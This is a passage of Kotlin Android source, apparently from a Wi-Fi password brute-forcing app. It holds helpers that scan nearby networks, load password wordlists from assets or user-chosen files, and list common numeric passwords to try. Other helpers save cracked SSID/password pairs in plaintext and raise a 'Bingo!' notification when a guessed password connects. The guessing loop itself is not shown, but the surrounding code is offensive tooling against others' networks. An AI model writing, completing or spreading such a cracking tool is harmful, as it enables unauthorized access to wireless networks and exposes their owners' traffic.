                    onValueChange = { newSsid = it },
                    label = { Text("SSID", color = redAccent) },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )
                OutlinedTextField(
                    value = newPass,
                    onValueChange = { newPass = it },
                    label = { Text("Password", color = redAccent) },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )
                Button(
                    onClick = {
                        onAddNetwork(newSsid, newPass)
                        newSsid = ""
                        newPass = ""
                        showAddForm = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("Save")
                }
            }
        }

        LazyColumn(
            modifier = Modifier.fillMaxSize(),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            items(savedList) { entry ->
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(panelColor)
                        .border(1.dp, Color(0xFF343438))
                        .padding(12.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column(
                        modifier = Modifier
                            .weight(1f)
                            .clickable { onConnectSaved(entry) }
                    ) {
                        Text(entry.ssid, color = redAccent, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                        Text("Password: ${entry.password}", color = redAccent, fontSize = 15.sp)
                        Text(entry.savedAt, color = Color.Gray, fontSize = 12.sp)
                    }

                    Box(
                        modifier = Modifier
                            .size(40.dp)
                            .background(Color(0xFF38383C))
                            .clickable { onDeleteEntry(entry) },
                        contentAlignment = Alignment.Center
                    ) {
                        Text("DEL", color = redAccent, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }
    }
}

@Composable
private fun StatLine(label: String, value: String, color: Color) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(label, color = color, fontSize = 15.sp)
        Text(value, color = color, fontSize = 15.sp)
    }
}

private const val PREFS_NAME = "red_wibr_prefs"
private const val KEY_SAVED_NETWORKS = "saved_networks_json"
private const val CHANNEL_ID = "wibr_success_channel"

private fun loadSavedNetworks(context: Context): List<SavedNetworkEntry> {
    val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    val raw = prefs.getString(KEY_SAVED_NETWORKS, null) ?: return emptyList()
    return runCatching {
        val arr = JSONArray(raw)
        buildList {
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                add(
                    SavedNetworkEntry(
                        ssid = obj.optString("ssid"),
                        password = obj.optString("password"),
                        savedAt = obj.optString("savedAt")
                    )
                )
            }
        }
    }.getOrElse { emptyList() }
}

private fun persistSavedNetworks(context: Context, list: List<SavedNetworkEntry>) {
    val arr = JSONArray()
    list.forEach { item ->
        arr.put(
            JSONObject().apply {
                put("ssid", item.ssid)
                put("password", item.password)
                put("savedAt", item.savedAt)
            }
        )
    }
    context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        .edit()
        .putString(KEY_SAVED_NETWORKS, arr.toString())
        .apply()
}

private fun createSuccessNotificationChannel(context: Context) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Wi-Fi Connection Results",
            NotificationManager.IMPORTANCE_HIGH
        ).apply {
            description = "Alerts when a Wi-Fi password succeeds"
        }
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.createNotificationChannel(channel)
    }
}

private fun sendSuccessNotification(context: Context, ssid: String, password: String) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
        ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
    ) {
        return
    }
    val notification = NotificationCompat.Builder(context, CHANNEL_ID)
        .setSmallIcon(R.drawable.ic_wibr_red)
        .setContentTitle("Bingo! Connected to $ssid")
        .setContentText("Password: $password")
        .setColor(0xFFFF3B30.toInt())
        .setPriority(NotificationCompat.PRIORITY_HIGH)
        .setAutoCancel(true)
        .build()

    val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    nm.notify(ssid.hashCode(), notification)
}

private fun loadAssetWordlist(context: Context, assetName: String): List<String> {
    return runCatching {
        context.assets.open(assetName).use { stream ->
            BufferedReader(InputStreamReader(stream)).readLines()
                .map { it.trim() }
                .filter { it.isNotEmpty() }
        }
    }.getOrElse { emptyList() }
}

private fun readWordlistFromUri(context: Context, uri: Uri): List<String> {
    return runCatching {
        context.contentResolver.openInputStream(uri)?.use { stream ->
            BufferedReader(InputStreamReader(stream)).readLines()
                .map { it.trim() }
                .filter { it.isNotEmpty() }
        } ?: emptyList()
    }.getOrElse { emptyList() }
}

private fun generateNumericPatterns(): List<String> {
    return listOf(
        "12345678", "123456789", "1234567890", "00000000", "11111111",
        "22222222", "33333333", "44444444", "55555555", "66666666",
        "77777777", "88888888", "99999999", "11223344", "22446688"
    )
}

@Suppress("DEPRECATION")
@SuppressLint("MissingPermission")
private fun readScanResultsOnly(context: Context): List<ScannedWifiNetwork> {
    val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        ?: return emptyList()
    val results = runCatching { wifiManager.scanResults }.getOrNull().orEmpty()
    return results
        .filter { !it.SSID.isNullOrBlank() }
        .distinctBy { "${it.SSID}_${it.BSSID}" }
        .sortedByDescending { it.level }
        .map { sr ->
            val pct = WifiManager.calculateSignalLevel(sr.level, 100).coerceIn(5, 100)
            ScannedWifiNetwork(
                ssid = sr.SSID,
                bssid = sr.BSSID ?: "00:00:00:00:00:00",
                capabilities = sr.capabilities ?: "[WPA2-PSK]",
                signalPercent = pct
            )
        }
}

@Suppress("DEPRECATION")
@SuppressLint("MissingPermission")
private fun performRealWifiScan(context: Context): List<ScannedWifiNetwork> {
    val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        ?: return emptyList()
    if (!wifiManager.isWifiEnabled) return emptyList()
    runCatching { wifiManager.startScan() }
    return readScanResultsOnly(context)
}

private fun inspectNetworkState(context: Context): String {
    val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val active = cm.activeNetwork ?: return "Disconnected"
    val caps = cm.getNetworkCapabilities(active) ?: return "Limited"
    val transport = when {
        caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
        caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data"
        else -> "Other"
    }
    val internet = if (caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) "Internet" else "Local"
    return "$transport ($internet)"
}